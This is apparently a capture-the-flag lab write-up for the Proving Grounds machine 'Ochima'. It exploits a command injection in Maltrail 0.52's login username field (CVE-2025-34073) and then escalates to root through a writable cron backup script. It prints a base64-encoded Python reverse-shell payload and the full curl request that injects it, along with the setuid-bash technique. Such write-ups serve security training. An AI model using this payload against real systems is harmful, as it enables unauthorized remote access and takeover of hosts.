---
layout: post
title: "Ochima - Proving Grounds Practice"
summary: "Maltrail 0.52 → CVE-2025-34073 → Command Injection on username parameter → RCE using curl → pspy64 → writeable backup script → overwrite backups script with chmod +s /bin/bash → root"
---

# Ochima - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed SSH, HTTP and 8338 ports were open.

<img width="910" height="455" alt="Image" src="https://github.com/user-attachments/assets/35d8faad-cc14-4f18-9e03-2ff20efa5a28" />

### Web Enumeration
Website at port 8338 was `Maltrail 0.52`

<img width="1286" height="834" alt="Image" src="https://github.com/user-attachments/assets/6754ee95-8ffe-4edd-a18b-24468fe02881" />

## Exploitation
### CVE-2025-34073
An unauthenticated command injection vulnerability exists in stamparm/maltrail (Maltrail) versions <=0.54. A remote attacker can execute arbitrary operating system commands via the username parameter in a POST request to the /login endpoint. This occurs due to unsafe handling of user-supplied input passed to subprocess.check_output() in core/http.py, allowing injection of shell metacharacters. Exploitation does not require authentication and commands are executed with the privileges of the Maltrail process.

I found a CVE for this version. All I need to do is inject a command to username parameter on /login endpoint.
At first I set up a payload as seen below.
```bash
echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.210\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" | base64 | tr -d '\n'

echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4yMTAiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIiknCg==' | base64 -d | sh
```

<img width="1479" height="264" alt="Image" src="https://github.com/user-attachments/assets/5230abba-5477-4957-9e00-81038f2d07db" />

And then executed a `curl` command.
```bash
curl 'http://192.168.206.32:8338/login' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/plain, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: http://192.168.206.32:8338' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://192.168.206.32:8338/' \
  -H 'Priority: u=0' \
  --data-raw "username=;\`echo \"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4yMTAiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIiknCg==\" | base64 -d | sh\`"
```

<img width="1480" height="276" alt="Image" src="https://github.com/user-attachments/assets/e00dda6a-c4dd-46c3-b714-6ba5bfd534dd" />

And I got the user shell.

<img width="686" height="181" alt="Image" src="https://github.com/user-attachments/assets/8f24c538-c729-4411-bdcd-f745f88b82d3" />

I read the user flag.

<img width="733" height="542" alt="Image" src="https://github.com/user-attachments/assets/e5252308-8549-4193-b15c-dfe6ccc4906f" />

## Privilege Escalation
### pspy64 
I executed pspy64 and found there was a backup script called every minute.

<img width="759" height="109" alt="Image" src="https://github.com/user-attachments/assets/9981d164-a60c-48fb-9b67-f1b1309c39cb" />

I checked the file and found out I could overwrite it.

<img width="624" height="372" alt="Image" src="https://github.com/user-attachments/assets/e955126c-09ee-48fb-a554-300ae670b2a6" />

So I updated the file to execute `chmod +s /bin/bash`.

<img width="646" height="192" alt="Image" src="https://github.com/user-attachments/assets/25861bc1-af2a-47b3-a083-611b98c893a8" />

And after waiting a minute I got the root.

<img width="709" height="452" alt="Image" src="https://github.com/user-attachments/assets/9503c1b0-4354-4970-a38d-10be45521648" />

